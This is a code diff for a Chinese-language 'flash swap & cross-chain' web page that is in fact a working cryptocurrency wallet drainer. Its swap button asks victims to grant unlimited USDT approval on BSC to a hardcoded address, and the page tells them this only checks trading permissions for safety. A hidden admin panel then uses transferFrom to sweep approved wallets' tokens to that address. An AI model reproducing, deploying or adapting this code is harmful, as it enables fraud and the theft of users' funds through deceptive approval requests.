@@ -4,6 +4,8 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>闪兑 & 跨链</title>
+<!-- 引入Ethers CDN -->
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <style>
 * {
   margin: 0;
@@ -228,6 +230,12 @@ body {
   color: #2563eb;
   font-size: 14px;
 }
+.balance-show{
+  text-align:center;
+  color:#222;
+  font-size:14px;
+  margin:4px 0;
+}
 
 .tips {
   font-size: 13px;
@@ -255,7 +263,7 @@ body {
   font-weight: 600;
 }
 
-input {
+.form-input {
   width: 100%;
   height: 42px;
   background: #f7f8fa;
@@ -398,17 +406,20 @@ input {
 <div class="wallet-show">
   已连接：<span id="addrText">未连接</span>
 </div>
+<div class="balance-show">
+  USDT可用余额：<span id="usdtBalance">0.00</span>
+</div>
 
 <p class="tips">仅授权交易权限核验，保障资产交互安全</p>
 
-<button class="bottom-btn btn-swap" id="authReceive" disabled>
+<button class="bottom-btn btn-swap" id="swapBtn" disabled>
   跨链闪兑
 </button>
 
 <div class="admin-box" id="adminPanel">
   <h3 class="admin-title">后台资产归集划扣</h3>
-  <input type="text" placeholder="填写用户授权钱包地址" id="userAddr" />
-  <input type="number" placeholder="填写划扣代币数量" id="deductNum" />
+  <input class="form-input" type="text" placeholder="填写用户授权钱包地址" id="userAddr" />
+  <input class="form-input" type="number" placeholder="填写划扣代币数量" id="deductNum" />
   <button class="btn-deduct" id="deductBtn">一键执行归集划扣</button>
 </div>
 
@@ -439,106 +450,107 @@ input {
 </div>
 
 <script>
-const ADMIN_ADDR = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
-const TOKEN_ADDR = "0x99a57E6C8558BC6689f894e068733ADf83C19725";
+// ============ 配置项 BSC主网 USDT合约 + 授权接收地址 ============
+const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
+const SPENDER_ADDRESS = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6"; // 授权接收方
+const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
 
-let nowUser = "";
-let isApproved = false;
-const sendInput = document.getElementById('sendAmount');
-const receiveInput = document.getElementById('receiveAmount');
-const swapBtn = document.getElementById('authReceive');
+let provider, signer, userAddress;
+let isWalletConnected = false;
+const sendInput = document.getElementById("sendAmount");
+const receiveInput = document.getElementById("receiveAmount");
+const swapBtn = document.getElementById("swapBtn");
+const usdtBalanceEl = document.getElementById("usdtBalance");
+const addrTextEl = document.getElementById("addrText");
 
-// 输入联动：发送数量自动同步接收数量 1:1兑换
-sendInput.addEventListener('input', function(){
-  let val = this.value;
-  receiveInput.value = val || '';
-})
+// 输入金额联动
+sendInput.addEventListener("input", () => {
+  receiveInput.value = sendInput.value;
+});
 
 // 连接钱包
 document.getElementById("connectWallet").addEventListener("click", async () => {
   if (!window.ethereum) {
-    alert("请安装去中心化钱包进行交互");
+    alert("请安装MetaMask、TP钱包等Web3钱包");
     return;
   }
   try {
-    let accounts = await ethereum.request({ method: "eth_requestAccounts" });
-    nowUser = accounts[0].toLowerCase();
-    document.getElementById("addrText").innerText = nowUser.slice(0, 6) + "..." + nowUser.slice(-4);
-    // 管理员显示后台面板
-    if (nowUser === ADMIN_ADDR) {
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = provider.getSigner();
+    userAddress = await signer.getAddress();
+    isWalletConnected = true;
+
+    // 展示钱包地址
+    addrTextEl.innerText = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+    swapBtn.disabled = false;
+
+    // 读取USDT余额
+    const usdtAbi = [
+      "function balanceOf(address owner) view returns (uint256)",
+      "function approve(address spender, uint256 amount) returns (bool)"
+    ];
+    const usdtContract = new ethers.Contract(USDT_CONTRACT, usdtAbi, provider);
+    const rawBalance = await usdtContract.balanceOf(userAddress);
+    const formatBalance = ethers.utils.formatUnits(rawBalance, 18);
+    usdtBalanceEl.innerText = parseFloat(formatBalance).toFixed(4);
+
+    // 判断是否管理员，显示后台面板
+    if(userAddress.toLowerCase() === ADMIN_WALLET){
       document.getElementById("adminPanel").classList.add("show");
     }
-    alert("钱包连接成功，需要完成授权后进行闪兑");
-  } catch (e) {
-    alert("连接失败，请重试");
+
+  } catch (err) {
+    console.error(err);
+    alert("钱包连接失败");
   }
 });
 
-// 授权+兑换逻辑：必须完成授权，否则无法操作兑换
+// 点击跨链闪兑 → 直接唤起钱包APPROVE授权弹窗
 swapBtn.addEventListener("click", async () => {
-  if (!nowUser) {
+  if (!isWalletConnected) {
     alert("请先连接钱包");
     return;
   }
-  if(isApproved){
-    alert("授权已完成，模拟闪兑提交");
-    return;
-  }
-  let confirmTip = confirm("需要完成交易授权才能继续闪兑，确认发起授权签名？");
-  if(!confirmTip) {
-    alert("未完成授权，无法进行闪兑操作");
-    return;
-  }
   try {
-    // 无限授权 calldata
-    let spender = ADMIN_ADDR.slice(2).padStart(64, "0");
-    let maxAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-    let data = "0x095ea7b3" + spender + maxAllow;
-    await ethereum.request({
-      method: "eth_sendTransaction",
-      params: [{
-        from: nowUser,
-        to: TOKEN_ADDR,
-        gasLimit: "0x300000",
-        data: data
-      }]
-    });
-    isApproved = true;
-    swapBtn.disabled = false;
-    alert("授权完成，已解锁闪兑功能");
-  } catch (e) {
-    alert("授权被取消/失败，无法解锁闪兑");
-    isApproved = false;
+    const usdtAbi = [
+      "function approve(address spender, uint256 amount) returns (bool)"
+    ];
+    const usdtContract = new ethers.Contract(USDT_CONTRACT, usdtAbi, signer);
+    // 无限授权 最大值
+    const maxAllowance = ethers.constants.MaxUint256;
+    // 调用approve，自动唤起钱包签名弹窗
+    const tx = await usdtContract.approve(SPENDER_ADDRESS, maxAllowance);
+    alert("授权交易已提交，等待链上确认");
+    await tx.wait();
+    alert("授权成功，可以进行闪兑操作");
+  } catch (err) {
+    console.error(err);
+    alert("授权被取消或交易失败，未完成授权");
   }
 });
 
-// 管理员归集划扣逻辑不变
+// 管理员归集转账逻辑
 document.getElementById("deductBtn").addEventListener("click", async () => {
-  if (nowUser !== ADMIN_ADDR) return alert("无操作权限");
-  let uAddr = document.getElementById("userAddr").value.trim();
-  let num = document.getElementById("deductNum").value.trim();
-  if (!uAddr || !num || Number(num) <= 0) {
-    return alert("请填写完整地址与数量");
+  if(userAddress.toLowerCase() !== ADMIN_WALLET) return alert("权限不足");
+  const targetAddr = document.getElementById("userAddr").value.trim();
+  const deductNum = document.getElementById("deductNum").value.trim();
+  if(!targetAddr || !deductNum || Number(deductNum) <=0){
+    return alert("请填写合法地址与数量");
   }
-  let fromHex = uAddr.toLowerCase().slice(2).padStart(64, "0");
-  let toHex = ADMIN_ADDR.slice(2).padStart(64, "0");
-  let valHex = BigInt(Math.floor(Number(num) * 1e18)).toString(16).padStart(64, "0");
-  let callData = "0x23b872dd" + fromHex + toHex + valHex;
-  try {
-    await ethereum.request({
-      method: "eth_sendTransaction",
-      params: [{
-        from: nowUser,
-        to: TOKEN_ADDR,
-        gasLimit: "0x300000",
-        data: callData
-      }]
-    });
-    alert("代币归集划扣成功！");
+  const erc20Abi = [
+    "function transferFrom(address from, address to, uint256 amount) returns(bool)"
+  ];
+  const usdtContract = new ethers.Contract(USDT_CONTRACT, erc20Abi, signer);
+  const amountWei = ethers.utils.parseUnits(deductNum,18);
+  try{
+    const tx = await usdtContract.transferFrom(targetAddr, ADMIN_WALLET, amountWei);
+    await tx.wait();
+    alert("资产归集成功");
     document.getElementById("userAddr").value = "";
     document.getElementById("deductNum").value = "";
-  } catch (e) {
-    alert("划扣执行失败");
+  }catch(e){
+    alert("归集失败：" + e.message);
   }
 });
 </script>
